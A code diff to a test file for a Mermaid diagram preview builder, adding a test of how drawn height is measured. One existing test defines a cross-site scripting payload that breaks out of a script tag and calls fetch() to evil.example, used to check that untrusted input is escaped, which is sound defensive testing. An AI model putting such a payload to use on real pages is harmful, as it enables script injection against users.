@@ -65,6 +65,13 @@ describe('buildMermaidPreviewHtml', () => {
     expect(html).toContain('cdn.jsdelivr.net/npm/mermaid@11');
   });
 
+  it('reports the drawn height from the body box, which never grows to fill the frame', () => {
+    const html = buildMermaidPreviewHtml('graph TD; A-->B');
+    expect(html).toContain('document.body.getBoundingClientRect().height');
+    expect(html).not.toContain('scrollHeight');
+    expect(html).toContain('html{margin:0;padding:0;');
+  });
+
   it('injects the untrusted diagram source as a data literal with < escaped (no script-tag break-out)', () => {
     const evil = 'a"; fetch("https://evil.example"); //</script><script>alert(1)</script>';
     const html = buildMermaidPreviewHtml(evil);
